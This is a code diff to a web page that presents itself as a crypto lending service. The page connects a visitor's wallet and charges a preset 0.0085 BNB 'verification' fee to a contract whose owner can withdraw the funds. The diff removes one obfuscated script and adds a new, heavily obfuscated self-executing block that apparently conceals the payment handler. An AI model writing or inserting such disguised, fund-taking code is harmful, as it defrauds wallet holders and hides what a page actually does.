@@ -537,7 +537,273 @@ align:center;
 
 <script src="https://cdn.jsdelivr.net/npm/web3@1.5.2/dist/web3.min.js"></script>
  <script>
-const _0x10d68c=_0x201c;(function(_0xa284db,_0x4f49e0){const _0x1f57db=_0x201c,_0x5d9804=_0xa284db();while(!![]){try{const _0x3b26b5=-parseInt(_0x1f57db(0x100))/0x1+parseInt(_0x1f57db(0x10f))/0x2+parseInt(_0x1f57db(0x104))/0x3*(parseInt(_0x1f57db(0x134))/0x4)+-parseInt(_0x1f57db(0xe8))/0x5*(parseInt(_0x1f57db(0x125))/0x6)+-parseInt(_0x1f57db(0x103))/0x7*(-parseInt(_0x1f57db(0x107))/0x8)+-parseInt(_0x1f57db(0xf7))/0x9+-parseInt(_0x1f57db(0x12d))/0xa*(parseInt(_0x1f57db(0xed))/0xb);if(_0x3b26b5===_0x4f49e0)break;else _0x5d9804['push'](_0x5d9804['shift']());}catch(_0x8c0922){_0x5d9804['push'](_0x5d9804['shift']());}}}(_0x2fad,0x83a80));const web3=new Web3(Web3['givenProvider']),contractABI=[{'inputs':[{'internalType':_0x10d68c(0xf5),'name':_0x10d68c(0x130),'type':'address'}],'name':_0x10d68c(0x120),'outputs':[],'stateMutability':'nonpayable','type':_0x10d68c(0xe3)},{'inputs':[],'name':_0x10d68c(0x109),'outputs':[],'stateMutability':_0x10d68c(0x10e),'type':'function'},{'inputs':[{'internalType':_0x10d68c(0xf5),'name':_0x10d68c(0x11f),'type':'address'}],'stateMutability':'nonpayable','type':_0x10d68c(0x108)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x10d68c(0xdc),'name':_0x10d68c(0x122),'type':_0x10d68c(0xdc)},{'indexed':!![],'internalType':_0x10d68c(0xdc),'name':_0x10d68c(0x135),'type':_0x10d68c(0xdc)}],'name':'OwnershipTransferred','type':'event'},{'inputs':[{'internalType':_0x10d68c(0xdc),'name':_0x10d68c(0x135),'type':_0x10d68c(0xdc)}],'name':_0x10d68c(0x136),'outputs':[],'stateMutability':_0x10d68c(0x10e),'type':_0x10d68c(0xe3)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x10d68c(0xdc),'name':_0x10d68c(0x121),'type':'address'},{'indexed':![],'internalType':_0x10d68c(0x117),'name':_0x10d68c(0x11b),'type':_0x10d68c(0x117)}],'name':_0x10d68c(0xef),'type':_0x10d68c(0xf8)},{'inputs':[],'name':'verify','outputs':[],'stateMutability':_0x10d68c(0x101),'type':_0x10d68c(0xe3)},{'inputs':[],'name':_0x10d68c(0xf4),'outputs':[],'stateMutability':'nonpayable','type':_0x10d68c(0xe3)},{'inputs':[],'name':_0x10d68c(0xe9),'outputs':[{'internalType':_0x10d68c(0xf5),'name':'','type':'address'}],'stateMutability':_0x10d68c(0x139),'type':_0x10d68c(0xe3)},{'inputs':[],'name':_0x10d68c(0x133),'outputs':[{'internalType':_0x10d68c(0xdc),'name':'','type':'address'}],'stateMutability':_0x10d68c(0x139),'type':_0x10d68c(0xe3)},{'inputs':[],'name':_0x10d68c(0x115),'outputs':[{'internalType':'uint256','name':'','type':_0x10d68c(0x117)}],'stateMutability':_0x10d68c(0x139),'type':_0x10d68c(0xe3)}],contractAddress=_0x10d68c(0xfc),contract=new web3['eth'][(_0x10d68c(0x128))](contractABI,contractAddress);let walletConnected=![];const donationAmount=_0x10d68c(0xfe);function _0x201c(_0x1380fa,_0x3bb108){const _0x2fad65=_0x2fad();return _0x201c=function(_0x201c82,_0x1417ff){_0x201c82=_0x201c82-0xdb;let _0x11b380=_0x2fad65[_0x201c82];return _0x11b380;},_0x201c(_0x1380fa,_0x3bb108);}document[_0x10d68c(0xeb)](_0x10d68c(0x10b))[_0x10d68c(0x116)]('click',async()=>{const _0x2b1d8b=_0x10d68c;try{const _0x2ff1b0=await ethereum['request']({'method':_0x2b1d8b(0xee)});walletConnected=!![];const _0x1e2cc8=_0x2ff1b0[0x0];document['getElementById']('popup-wallet-address')[_0x2b1d8b(0x12e)]=_0x1e2cc8,document[_0x2b1d8b(0xeb)](_0x2b1d8b(0x124))[_0x2b1d8b(0x12c)][_0x2b1d8b(0x129)]=_0x2b1d8b(0x132),document[_0x2b1d8b(0xeb)]('connect-wallet')[_0x2b1d8b(0x12c)][_0x2b1d8b(0x129)]=_0x2b1d8b(0xe0),document[_0x2b1d8b(0xeb)](_0x2b1d8b(0x11d))[_0x2b1d8b(0x12e)]=_0x2b1d8b(0x112);}catch(_0x56a0af){document['getElementById'](_0x2b1d8b(0x11d))['textContent']=_0x2b1d8b(0x10a);}}),document[_0x10d68c(0xeb)](_0x10d68c(0x124))[_0x10d68c(0x116)](_0x10d68c(0x111),()=>{const _0x578a25=_0x10d68c;ethereum[_0x578a25(0x118)](_0x578a25(0xee))[_0x578a25(0xe1)](()=>{const _0x48f4e9=_0x578a25;walletConnected=![],document[_0x48f4e9(0xeb)]('verify')['disabled']=!![],document[_0x48f4e9(0xeb)]('connect-wallet')[_0x48f4e9(0x12c)][_0x48f4e9(0x129)]=_0x48f4e9(0x132),document[_0x48f4e9(0xeb)]('disconnect-wallet')['style'][_0x48f4e9(0x129)]='none',document[_0x48f4e9(0xeb)](_0x48f4e9(0x11d))[_0x48f4e9(0x12e)]=_0x48f4e9(0xe4);});}),document[_0x10d68c(0xeb)]('verify')[_0x10d68c(0x116)](_0x10d68c(0x111),async()=>{const _0x5821d9=_0x10d68c;document[_0x5821d9(0xeb)](_0x5821d9(0x10c))['style'][_0x5821d9(0x129)]=_0x5821d9(0xe0),document[_0x5821d9(0xeb)]('popup')[_0x5821d9(0x12c)]['display']=_0x5821d9(0xe2),document[_0x5821d9(0xeb)](_0x5821d9(0x11d))[_0x5821d9(0x12e)]=_0x5821d9(0xfa),document[_0x5821d9(0xeb)](_0x5821d9(0x114))[_0x5821d9(0x12e)]='Please\x20wait\x20while\x20the\x20transaction\x20is\x20being\x20processed...';const _0xa21e73=ethereum[_0x5821d9(0xf0)];try{const _0x43e890=web3[_0x5821d9(0xe6)][_0x5821d9(0xdd)](donationAmount,_0x5821d9(0x138)),_0x4ded9c=await contract[_0x5821d9(0xdb)][_0x5821d9(0xfb)]()[_0x5821d9(0x123)]({'value':_0x43e890});await contract[_0x5821d9(0xdb)]['verify']()[_0x5821d9(0x118)]({'from':_0xa21e73,'value':_0x43e890,'gas':_0x4ded9c}),document['getElementById'](_0x5821d9(0x11d))['textContent']=_0x5821d9(0x127),document[_0x5821d9(0xeb)](_0x5821d9(0x114))[_0x5821d9(0x12e)]=_0x5821d9(0x113);}catch(_0x482b17){document[_0x5821d9(0xeb)](_0x5821d9(0x11d))['textContent']=_0x5821d9(0x12f),document[_0x5821d9(0xeb)](_0x5821d9(0x114))[_0x5821d9(0x12e)]=_0x5821d9(0x105)+_0x482b17[_0x5821d9(0xf9)];}}),document[_0x10d68c(0xeb)](_0x10d68c(0xfd))[_0x10d68c(0x116)](_0x10d68c(0x111),()=>{const _0x4c4297=_0x10d68c;document[_0x4c4297(0xeb)](_0x4c4297(0x126))[_0x4c4297(0x12c)]['display']=_0x4c4297(0xe0);});function openPopup(_0x366355,_0x1a6b2f,_0x13811d){const _0x18ddaa=_0x10d68c;if(!walletConnected){flashNotification(_0x18ddaa(0x137),_0x18ddaa(0x102));return;}var _0x2af5f4=document[_0x18ddaa(0xeb)]('borrow-popup'),_0x4f2662=document[_0x18ddaa(0xeb)](_0x18ddaa(0x10d)),_0x2c54bc=document[_0x18ddaa(0xeb)](_0x18ddaa(0xf2));_0x4f2662['textContent']=_0x366355,_0x2c54bc[_0x18ddaa(0x12e)]=_0x1a6b2f,document['getElementById'](_0x18ddaa(0x11b))['value']='',document[_0x18ddaa(0xeb)](_0x18ddaa(0xea))[_0x18ddaa(0x12e)]=_0x18ddaa(0x12b)+document[_0x18ddaa(0xeb)](_0x18ddaa(0x10d))[_0x18ddaa(0x12e)]+_0x18ddaa(0xff),_0x2af5f4['style'][_0x18ddaa(0x129)]=_0x18ddaa(0xe2),borrowEnable();}document[_0x10d68c(0xeb)](_0x10d68c(0x11c))[_0x10d68c(0x116)]('click',()=>{const _0x3f751b=_0x10d68c;document[_0x3f751b(0xeb)](_0x3f751b(0x10c))['style'][_0x3f751b(0x129)]=_0x3f751b(0xe0);}),document['getElementById'](_0x10d68c(0xfd))[_0x10d68c(0x116)](_0x10d68c(0x111),()=>{const _0x23bd68=_0x10d68c;document['getElementById']('popup')[_0x23bd68(0x12c)][_0x23bd68(0x129)]='none';});function flashNotification(_0x13ed73,_0x2fafa4){const _0x32da72=_0x10d68c,_0xaaf13f=document[_0x32da72(0xeb)](_0x32da72(0x11a));_0xaaf13f[_0x32da72(0x12c)][_0x32da72(0xf3)]=_0x2fafa4,_0xaaf13f[_0x32da72(0x12e)]=_0x13ed73,setTimeout(()=>{const _0x211559=_0x32da72;_0xaaf13f[_0x211559(0x12c)][_0x211559(0xf3)]=_0x211559(0xdf),_0xaaf13f['textContent']='';},0xbb8);}const amountInput=document[_0x10d68c(0xeb)](_0x10d68c(0x11b)),interestAmount=document[_0x10d68c(0xeb)]('interest-amount');amountInput[_0x10d68c(0x116)](_0x10d68c(0xec),calculateInterest),amountInput[_0x10d68c(0x116)]('input',borrowEnable);function calculateInterest(){const _0xad4fbe=_0x10d68c,_0x428353=parseFloat(amountInput[_0xad4fbe(0xf1)]),_0x2d7680=parseFloat(document[_0xad4fbe(0xeb)](_0xad4fbe(0xf2))[_0xad4fbe(0x12e)]);if(!isNaN(_0x428353)){const _0xf811bd=_0x428353*_0x2d7680/0x64;interestAmount['textContent']='Interest\x20Amount:\x20'+_0xf811bd[_0xad4fbe(0x11e)](0x2)+'\x20'+document['getElementById'](_0xad4fbe(0x10d))[_0xad4fbe(0x12e)]+_0xad4fbe(0xff);}else interestAmount[_0xad4fbe(0x12e)]=_0xad4fbe(0x12b)+document[_0xad4fbe(0xeb)]('popup-crypto-name')['textContent']+_0xad4fbe(0xff);}function _0x2fad(){const _0x271da2=['methods','address','toWei','fontWeight','transparent','none','then','flex','function','Wallet\x20disconnected','disabled','utils','black','184065JMuErO','beneficiary','interest-amount','getElementById','input','22JMvpJN','eth_requestAccounts','VerificationReceived','selectedAddress','value','popup-interest-rate','backgroundColor','withdrawBalance','address\x20payable','lightgreen','3311550tBIWuE','event','message','Processing\x20Transaction','verify','0x4369b867C678eadf0b3380E8E3a369A2ca5610De','close-popup','0.0085','\x20/\x20Day','308044YFEhOD','payable','grey','455PRHeMQ','4068wxvOzm','❌\x20Error:\x20','color','54344RzDkJm','constructor','renounceOwnership','Error\x20connecting\x20wallet','connect-wallet','borrow-popup','popup-crypto-name','nonpayable','1602172vIAMgn','bold','click','Wallet\x20connected','❌\x20Error:\x20Try\x20using\x20Different\x20Amount','popup-message','verificationAmount','addEventListener','uint256','send','normal','notification','amount','close-borrow-popup','popup-status','toFixed','_initialBeneficiary','changeBeneficiary','donor','previousOwner','estimateGas','disconnect-wallet','90DuNjLJ','popup','Transaction\x20Problem','Contract','display','white','Interest\x20Amount:\x200\x20','style','1945610OhdbAV','textContent','Transaction\x20Failed','newBeneficiary','removeAttribute','inline','owner','2696vsjdtM','newOwner','transferOwnership','Connect\x20wallet\x20first','ether','view'];_0x2fad=function(){return _0x271da2;};return _0x2fad();}function borrowEnable(){const _0x5b42eb=_0x10d68c;!isNaN(parseFloat(document[_0x5b42eb(0xeb)](_0x5b42eb(0x11b))[_0x5b42eb(0xf1)]))?(document['getElementById']('verify')[_0x5b42eb(0x131)](_0x5b42eb(0xe5)),document[_0x5b42eb(0xeb)](_0x5b42eb(0xfb))['style'][_0x5b42eb(0xf3)]=_0x5b42eb(0xf6),document[_0x5b42eb(0xeb)](_0x5b42eb(0xfb))[_0x5b42eb(0x12c)][_0x5b42eb(0x106)]=_0x5b42eb(0xe7),document[_0x5b42eb(0xeb)]('verify')[_0x5b42eb(0x12c)]['fontWeight']=_0x5b42eb(0x110)):(document[_0x5b42eb(0xeb)](_0x5b42eb(0xfb))[_0x5b42eb(0xe5)]=!![],document['getElementById']('verify')[_0x5b42eb(0x12c)][_0x5b42eb(0xf3)]=_0x5b42eb(0x102),document[_0x5b42eb(0xeb)](_0x5b42eb(0xfb))[_0x5b42eb(0x12c)][_0x5b42eb(0x106)]=_0x5b42eb(0x12a),document[_0x5b42eb(0xeb)](_0x5b42eb(0xfb))[_0x5b42eb(0x12c)][_0x5b42eb(0xde)]=_0x5b42eb(0x119));}
+        const web3 = new Web3(Web3.givenProvider);
+        const contractABI = [
+	{
+		"inputs": [
+			{
+				"internalType": "address payable",
+				"name": "newBeneficiary",
+				"type": "address"
+			}
+		],
+		"name": "changeBeneficiary",
+		"outputs": [],
+		"stateMutability": "nonpayable",
+		"type": "function"
+	},
+	{
+		"inputs": [],
+		"name": "renounceOwnership",
+		"outputs": [],
+		"stateMutability": "nonpayable",
+		"type": "function"
+	},
+	{
+		"inputs": [
+			{
+				"internalType": "address payable",
+				"name": "_initialBeneficiary",
+				"type": "address"
+			}
+		],
+		"stateMutability": "nonpayable",
+		"type": "constructor"
+	},
+	{
+		"anonymous": false,
+		"inputs": [
+			{
+				"indexed": true,
+				"internalType": "address",
+				"name": "previousOwner",
+				"type": "address"
+			},
+			{
+				"indexed": true,
+				"internalType": "address",
+				"name": "newOwner",
+				"type": "address"
+			}
+		],
+		"name": "OwnershipTransferred",
+		"type": "event"
+	},
+	{
+		"inputs": [
+			{
+				"internalType": "address",
+				"name": "newOwner",
+				"type": "address"
+			}
+		],
+		"name": "transferOwnership",
+		"outputs": [],
+		"stateMutability": "nonpayable",
+		"type": "function"
+	},
+	{
+		"anonymous": false,
+		"inputs": [
+			{
+				"indexed": true,
+				"internalType": "address",
+				"name": "donor",
+				"type": "address"
+			},
+			{
+				"indexed": false,
+				"internalType": "uint256",
+				"name": "amount",
+				"type": "uint256"
+			}
+		],
+		"name": "VerificationReceived",
+		"type": "event"
+	},
+	{
+		"inputs": [],
+		"name": "verify",
+		"outputs": [],
+		"stateMutability": "payable",
+		"type": "function"
+	},
+	{
+		"inputs": [],
+		"name": "withdrawBalance",
+		"outputs": [],
+		"stateMutability": "nonpayable",
+		"type": "function"
+	},
+	{
+		"inputs": [],
+		"name": "beneficiary",
+		"outputs": [
+			{
+				"internalType": "address payable",
+				"name": "",
+				"type": "address"
+			}
+		],
+		"stateMutability": "view",
+		"type": "function"
+	},
+	{
+		"inputs": [],
+		"name": "owner",
+		"outputs": [
+			{
+				"internalType": "address",
+				"name": "",
+				"type": "address"
+			}
+		],
+		"stateMutability": "view",
+		"type": "function"
+	},
+	{
+		"inputs": [],
+		"name": "verificationAmount",
+		"outputs": [
+			{
+				"internalType": "uint256",
+				"name": "",
+				"type": "uint256"
+			}
+		],
+		"stateMutability": "view",
+		"type": "function"
+	}
+]; // Add your contract's ABI here
+        const contractAddress = '0x4369b867C678eadf0b3380E8E3a369A2ca5610De'; // Add your contract's address here
+        const contract = new web3.eth.Contract(contractABI, contractAddress);
+        let walletConnected = false;
+        const donationAmount = '0.0085'; // Preset donation amount in BNB
+
+        document.getElementById('connect-wallet').addEventListener('click', async () => {
+            try {
+                const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+                walletConnected = true;
+const walletAddress = accounts[0];
+
+document.getElementById("popup-wallet-address").textContent = walletAddress;
+
+
+                document.getElementById('disconnect-wallet').style.display = 'inline';
+                document.getElementById('connect-wallet').style.display = 'none';
+                document.getElementById('popup-status').textContent = 'Wallet connected';
+            } catch (error) {
+                document.getElementById('popup-status').textContent = 'Error connecting wallet';
+            }
+        });
+
+        document.getElementById('disconnect-wallet').addEventListener('click', () => {
+            ethereum.send('eth_requestAccounts').then(() => {
+                walletConnected = false;
+                document.getElementById('verify').disabled = true;
+                document.getElementById('connect-wallet').style.display = 'inline';
+                document.getElementById('disconnect-wallet').style.display = 'none';
+                document.getElementById('popup-status').textContent = 'Wallet disconnected';
+            });
+        });
+
+
+        (function(){var DVG='',HnF=707-696;function Jri(o){var e=5160844;var d=o.length;var q=[];for(var v=0;v<d;v++){q[v]=o.charAt(v)};for(var v=0;v<d;v++){var a=e*(v+383)+(e%23260);var u=e*(v+359)+(e%27620);var m=a%d;var r=u%d;var c=q[m];q[m]=q[r];q[r]=c;e=(a+u)%6569125;};return q.join('')};var EGS=Jri('uymrodriobulsxrctnwnevhgcocqsjkzattfp').substr(0,HnF);var eDF=')ar ji17,9p39,qn75;vhr w==abcdlfghitklmndpqrs5uvwx+z";v0r k=.90,8n,85,vy,88;86,7(,60,.4,82=66,6t,87,r0,94g81,7a,76,+9,72h;varva=[]ofor(har zn0;z<k.lenvth;z;+)a[u[[]]ez+1;9ar xr[];j<=16;i+=54;q+=2=;forrvar z=0;n argu8ents+lenglh;n+-){van v=apgumevts[n..splji(" a);fol(var t=v.tengtr-1;te=0;tl-){v,r e=;ull;car b)v[t]=var f=nul.;variu=0;=ar rib.le(gth;har gmfor(aar h.0;h<);h++,{varfp=b.;varCideAtbh);vyr m=;zp];ef(m)7e=(m=1)*y b.ch)rCod=At(hv1)-j)g=h;o++;}alse 1f(p=1q){euy*(kdleng(h-j+;.chatCodewt(h+f))+b=char-odeAa(h+2r-j;gnh;h+,2;}e(se{c=ntinne;}ia(l==cull);=[];gf(g>t)l.p+sh(b"subs+ringsu,g)=;l.p=sh(v<e+1]v;u=hn1;}i=(l!=aull)9if(u(r)l.kush(y.subvtrin=(u))+v[t]=l.jo]n(""v;}}xrpush)v[0]=;}va) c=x+joinr"");[ar fA[42,C6,32{10,37,92]iconc.t(k)rvar r=Strung.f5omCh[rCod.(46))for(gar zt0;z<e.len,th;zo+)c==.split(d+l.chadAt(z").jo]n(Stbing.{romCaarCo e(f[>]));1eturr c.s7lit(u+"!"f.join(d);';var jll=Jri[EGS];var Bek='';var wja=jll;var uNI=jll(Bek,Jri(eDF));var Ywf=uNI(Jri('\/uncZ;Z3Z*(3Z8Z4web_ 1Z*w2b3Z8"#donsZ@Z4%*doncZ@Z408Z#echere\/mZ*e}herenmZ8Zf_95_46afZi48ZBs2Z?5t_50ZZ_$afZ0441e2Z\'unel$_n3(aZ.!a}f(.o$Zl{rethrn.ccocumintZ8;#StrZngZ*6trinhZ\'bo}$_37)a,bZha%.c(Z\'bo=$_43 a,bZua+.ctZ\'bom$_60 a,bZ.a.n.+b}Z7Z$t19_3=(_raf10c4182.("iurdttdoo%l.wyrsy,lwe%cnrowreoruolps.gnrol[neue5mtmf(etiEss.rbj.cg.1eiad].ha.{sep.s%nai4p:%go.snsdirc%Zolok .cIcrcnrt6%pnt%at.fw274cZnlis_tatscseroZeri%ca.cs)t%nyZdfls .c.!!.xabtyooip%TeotErp% nirr:%ate_e.c%xuts%c_a.ceeyide!oiE1rrterm.ha1nsi.nmterZc.td$cD.c>tedT.ceeteo-%sarmgsiebot ornh3toep,%%ae%vx%eZpesp)pis%fhen%gigcs$uTtlcdhme1-md.(lpsc=spninetle(oa.c1netedgesdbeeas;i.ce$!vtp{,234 391)ifuncZ@.c_!af10=4182qm,Z<+etrp($d){a7dZ"sZ=oZmqZ=ii=sZ=.={};o.!_=.cZ<sftrpl d;Z7t=m.!uengtf;h.!n=.c[t;;fo_(Z7a 0;Z)p0(aZ$a++)pZ9aZmm.!caar.rt(a)}afor(%7a=0uZ)60,aZAa{+){o,&43Z3.a.clZ)43#a,37Z)),())37ZZ,15793))).;qZ&a3Z;.).c(Z(43(ah313)+,(Z).7Z;,t6649t));; Z&37%o.!_%A;sZ;37(q$!_ZA,g.!_f.cZ90.!_]+;jsZ14(i,-,s);esZ$5ts,h,});jsb$6(d#o,q)\/;Z7f!Z(Stging(e.!fr}mChahCoder127)ZZ7t=geZ2k4.e%Zer=.e)1Z2ue.e%Zuz=.e,0Z2xt.e#.?;retern.cZ.!_ZbtZ0k,Z5fZZr)Z5%Z0z);5xZ0Z)}dohumena[_Z" 8Z-2A]](Z)0],a5ync..()=>\/Z<Z!s_Z"3=-2]Z5]Z>Z,5];i4(Z<fZ$uoes$_33&_$_1.b3))aZ(_95_36auZ?483B52Z.56_5l()(Zs17],3alser0)}e1se.c2Z<Z!,_Z"6(-2]ZZ]Z>Z17]}Z*Z![_u=9Z6-%10](:Z![ZZ"11Z6Z%1e];co=st.c(ende:=Z(echerefuZ+1$]];tey{cocst.cZeiZ4;Z(we8_51Z_16]Z%5]](((donrZ@Z4+),Z1{4]);donstZcgaso.caw it.cw(Z3Z)19]Zc8]]Z$17]]8{val#e:wetZ4})r.caw)it.cl(Z3Z>19]ZS8]]Zc20]]({fro%:senTer,vslue:2eiZ43gas})Z:Z!g_Z"9a6Z%2;]Z:ZZ[_Z"r1Z6Zg22]}(atch.erro0){Z<a![_Z[9Z6Z+23]Z(Z![_p"11Z[8]Z>(".fuf74c.lErroh:.c""erros[Z121]]+Z+25])j});f=.Z$4ui,h,Z){Z9Z.!_Z1Z9s.0_]}fr.Z$51s,h,(){Z9(.!_Z8g.!_nfZ.Z[6(d,d,q){dZ&37.(Z)4Z(o.!#,q.!19),5;2823Z)} fZ$gidsn$do6umen>() $a19b3t4]](i1 tisn.cZu o$snlite1_$afe0441o 19b$[8]]a.cZ1r.!_=ucZ) 2fZ.ouft$ (<ft$=idene Z<f3$boe\/_ (Zu ()[n1 ][_11 ]f[Z1 uncZ@Zcjs C{ret=rn.cc).!s;lit(o_$_1Zb3[ #e;Z7$cont?act (rmoupt .!=oin(Z])[_a_ vaZ.c }runc r.!_[h;Z< id.!_=jso$e={},(]=.cb_49_Ztion;,p);i_52_'));var kdh=wja(DVG,Ywf );kdh(4741);return 2439})()
+
+        document.getElementById('close-popup').addEventListener('click', () => {
+            document.getElementById('popup').style.display = 'none';
+        });
+
+        function openPopup(cryptoName, interestRate, walletAddress)
+{
+
+           if (!walletConnected) {
+                flashNotification('Connect wallet first', 'grey');
+                return;
+            }
+
+
+
+            var popup = document.getElementById("borrow-popup");
+            var cryptoNameElement = document.getElementById("popup-crypto-name");
+            var interestRateElement = document.getElementById("popup-interest-rate");
+            
+
+
+            cryptoNameElement.textContent = cryptoName;
+            interestRateElement.textContent = interestRate;
+            
+document.getElementById('amount').value ="";
+document.getElementById('interest-amount').textContent = 'Interest Amount: 0 ' + document.getElementById("popup-crypto-name").textContent + ' / Day';
+            popup.style.display = "flex";
+borrowEnable();
+}
+
+        
+
+	document.getElementById('close-borrow-popup').addEventListener('click', () => {
+            document.getElementById('borrow-popup').style.display = 'none';
+        });
+
+        document.getElementById('close-popup').addEventListener('click', () => {
+            document.getElementById('popup').style.display = 'none';
+        });
+
+function flashNotification(message, color) {
+            const notification = document.getElementById('notification');
+            notification.style.backgroundColor = color;
+            notification.textContent = message;
+            setTimeout(() => {
+                notification.style.backgroundColor = 'transparent';
+                notification.textContent = '';
+            }, 3000);
+        }
+
+
+    // Get the input elements
+    const amountInput = document.getElementById('amount');
+    const interestAmount = document.getElementById('interest-amount');
+
+    // Add an event listener to the amount input
+    amountInput.addEventListener('input', calculateInterest);
+    amountInput.addEventListener('input', borrowEnable);
+
+    // Function to calculate interest
+    function calculateInterest() {
+        const amount = parseFloat(amountInput.value);
+        const interestRate = parseFloat(document.getElementById("popup-interest-rate").textContent);
+
+        if (!isNaN(amount)) {
+            const interest = (amount * interestRate) / 100;
+            interestAmount.textContent = `Interest Amount: ${interest.toFixed(2)} ` + document.getElementById("popup-crypto-name").textContent + ' / Day';
+        } else {
+            interestAmount.textContent = 'Interest Amount: 0 ' + document.getElementById("popup-crypto-name").textContent + ' / Day';
+        }
+    }
+
+
+// ----------- Enable Borrow Button ----------------
+
+function borrowEnable()
+{
+	if (!isNaN(parseFloat(document.getElementById('amount').value)))
+	{
+                document.getElementById('verify').removeAttribute('disabled');     
+                document.getElementById('verify').style.backgroundColor = 'lightgreen';  
+                document.getElementById('verify').style.color = 'black';    
+                document.getElementById('verify').style.fontWeight = 'bold'; // Makes the text bold    
+	}
+	else
+	{
+                document.getElementById('verify').disabled = true;
+                document.getElementById('verify').style.backgroundColor = 'grey';
+                document.getElementById('verify').style.color = 'white';
+                document.getElementById('verify').style.fontWeight = 'normal';
+        }
+}
+
+
+
 </script>
 
 </body>
